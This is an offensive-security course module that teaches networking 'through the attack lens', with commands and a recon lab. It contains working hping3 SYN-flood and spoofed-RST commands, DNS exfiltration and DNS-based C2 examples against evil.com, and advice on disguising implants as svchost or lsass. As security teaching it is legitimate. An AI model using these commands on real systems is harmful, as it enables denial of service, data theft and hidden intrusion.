Module 01 — Networking Through the Attack Lens

First Principle: Every layer is an attack surface. You don't need to be a network engineer. You need to know where to stab.
Section 1: The OSI Model Is a Target Map

You've probably seen the OSI model in a cert prep book. Forget that framing. Here's what it actually is: a stack of 7 attack surfaces, each with its own protocols and its own set of exploits. An attacker doesn't work through all 7 layers — they find the layer with the weakest control and go straight there.

Layer Name Protocols What you attack here
7 Application HTTP, HTTPS, DNS, FTP, SMTP SQL injection, XSS, SSRF, request smuggling, credential stuffing, payload delivery, C2 callbacks
6 Presentation TLS, SSL, encoding SSL stripping, cert spoofing, encoding bypass, MIME confusion
5 Session NetBIOS, SMB, RPC Session hijacking, SMB relay, pass-the-hash, NTLM downgrade
4 Transport TCP, UDP SYN flood (DoS), port scanning, service fingerprinting, session hijack via ISN prediction
3 Network IP, ICMP, routing IP spoofing, ICMP tunnel (covert channel), route poisoning, fragmentation attacks
2 Data Link Ethernet, ARP, MAC ARP spoofing (MitM), MAC flooding, VLAN hopping, 802.1Q double-tagging
1 Physical Cable, RF, WiFi Evil twin AP, packet capture on open WiFi, Bluetooth keylogger, cable tap
You live at L2, L4, and L7. Everything else is for specialists. The exam will test all 7. Ops only needs 3.
Section 2: TCP/IP — Three Packets to Open, One RST to Break

Every TCP connection runs the same handshake. Three packets. The attacker's interest: the handshake creates state on the server. That state can be exhausted. And the sequence numbers that track data can be predicted — which lets you inject packets mid-stream.

# 3-WAY HANDSHAKE Client (.42) Server (.92:4443) │ SYN seq=1842930124 ───────────────► │ │ │ Server allocates connection slot │ ◄──────── SYN-ACK seq=3301054821 │ │ ack=1842930125 │ │ │ │ ACK ack=3301054822 ──────────────► │ │ │ CONNECTION ESTABLISHED │ DATA ◄──────────────────────────► │
# SYN FLOOD — exhaust server connection table $ hping3 -S -p 443 --flood --rand-source 192.168.1.92 # Sends SYNs at wire speed, never completes ACK # Server allocates state for each → table fills → DoS # --rand-source spoofs source IP → responses go nowhere
# TCP RST ATTACK — kill an existing connection $ hping3 -R -p 4443 -a 192.168.1.42 192.168.1.92 # Spoofs a RST packet from .42 to .92:4443 # If sequence number lands in the accept window → connection drops # Used to kill C2 sessions or disrupt comms
The sequence number is the only "auth" on a TCP connection. Predict it, and you own the session. On modern OSes the ISN is randomised — but tools like nmap can still fingerprint the randomness quality.
Section 3: DNS — Reconnaissance Goldmine and Exfil Channel

DNS is the internet's phone book. It's also one of the most abused protocols in offensive security — because it's always allowed out. Firewalls block TCP 4444. They almost never block UDP 53.

# Real output — 192.168.1.92 asking for google.com PS> nslookup google.com Server: RT-AC68U-95B0 Address: 192.168.1.1 Non-authoritative answer: Name: google.com Addresses: 142.250.195.110 2404:6800:4006:807::200e

The full resolution chain: your machine → router (192.168.1.1) → ISP resolver → root nameserver → .com TLD → google.com authoritative NS → IP returned. As an attacker, two techniques use this chain against the target:

# DNS EXFILTRATION — encode data in subdomain queries # Attacker controls ns1.evil.com. Victim machine sends: aGVsbG8=.evil.com → base64("hello") leaks in DNS query log d29ybGQ=.evil.com → base64("world") — next chunk # Your nameserver logs every query → you reconstruct the payload # Works through firewalls that block all TCP but allow outbound DNS
# C2 OVER DNS — command channel in TXT records # Implant polls: TXT record of cmd.evil.com → reads command # Response: encodes output in subdomain query to ns.evil.com # Tools: dnscat2, iodine, DNScat # PASSIVE RECON — certificate transparency # Every cert ever issued is logged publicly. No scanning needed. $ curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' # Returns every subdomain that ever had a TLS cert # api.target.com, admin.target.com, vpn.target.com, internal.target.com
RULE: Before you touch a target, exhaust passive recon. crt.sh + reverse DNS + WHOIS = attack surface map with zero packets sent to the target.
Section 4: Reading NETSTAT — Spot the C2 Session

On a machine you've compromised, netstat -ano tells you what connections the implant is maintaining and whether anyone else is in there with you. On a machine you're defending, the same command tells you if there's an implant.

PS> netstat -ano | Select-String ESTABLISHED Proto Local Address Foreign Address State PID TCP 192.168.1.92:22 192.168.1.42:52891 ESTABLISHED 1092 # SSH (you) TCP 192.168.1.92:4443 192.168.1.42:11025 ESTABLISHED 31248 # C2 session TCP 192.168.1.92:49821 52.113.194.132:443 ESTABLISHED 25168 # Discord TCP 192.168.1.92:54201 34.107.221.82:443 ESTABLISHED 3984 # Chrome
# Correlate PID → process name PS> Get-Process -Id 31248 | Select-Object Id, Name, Path, StartTime Id Name Path StartTime ----- ------ ----------------------------------------- ------------------- 31248 python C:\Users\gwu07\cheyanne\c2_server.py 2026-06-28 08:14:33
Port 4443 + Python process = C2 listener. Not a browser. Not a system service. That's your IOC. A blue teamer running this on your implanted machine finds you in 30 seconds.

Attacker's counter: use ports that blend in. Port 443 (HTTPS), port 80 (HTTP), port 53 (DNS). Run your implant under a process name that looks like a system service. On Windows: svchost.exe, lsass.exe, explorer.exe — but be careful, injecting into critical processes causes bluescreens.

Section 5: Port Scanning — Map Before You Attack

Before you exploit anything, you map. What ports are open, what service is running on each, what version. The version is your CVE lookup key. nmap is the standard — it sends carefully crafted probes and reads the responses.

# Basic scan — top 1000 ports, version detection $ nmap -sV -T4 192.168.1.92 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.8 (Windows) 1337/tcp open postgresql PostgreSQL 16.x 4443/tcp open https? Python/3.14 8080/tcp open http Apache httpd 2.4 # -sV = service/version detection (reads banners) # -T4 = aggressive timing (fast, noisy, IDSable) # -sS = stealth SYN scan — don't complete the handshake (default with root) # -A = OS detection + traceroute + scripts (very noisy) # -p- = all 65535 ports (slow but complete)
# Subnet sweep — find live hosts first $ nmap -sn 192.168.1.0/24 Nmap scan report for RT-AC68U-95B0 (192.168.1.1) Host is up Nmap scan report for WUPC (192.168.1.42) Host is up Nmap scan report for LAPTOP-R32M8MLI (192.168.1.92) Host is up Nmap scan report for Radon_Laptop1.local (192.168.1.145) Host is up Nmap scan report for ESP_D25C86 (192.168.1.250) Host is up # -sn = ping scan (no port scan, just host discovery) # ICMP blocked by Windows? nmap falls back to TCP SYN on 80/443
Nmap writes to disk. If the target has EDR watching file I/O, nmap's temporary files may trigger. For stealthier scanning: masscan (raw packets, no temp files) or PowerShell-native TCP probes.

Interactive Networking Demo — Live Lab Data
Lab: Network Recon Survival

Run every command. All must work before you advance. If you're on Windows, some nmap commands require Npcap installed.

1. ipconfig /all # Your IP, MAC, DNS server 2. nslookup google.com # DNS resolution chain 3. tracert 8.8.8.8 # Map your egress path 4. arp -a # ARP table — who's on your LAN 5. netstat -ano | findstr ESTABLISHED # Active connections 6. netstat -ano | findstr :443 # HTTPS connections 7. Get-Process | Sort-Object CPU -Desc | head -10 # Top CPU consumers 8. nmap -sn 192.168.1.0/24 # Sweep your subnet 9. nmap -sV -T4 <your-ip> # Scan yourself 10. curl -s "https://crt.sh/?q=%.google.com&output=json" | python -m json.tool | head -30 # Cert transparency recon on Google
Step 10 returned every Google subdomain ever issued a cert. That's passive recon — zero packets sent to the target. That's how you start every engagement.
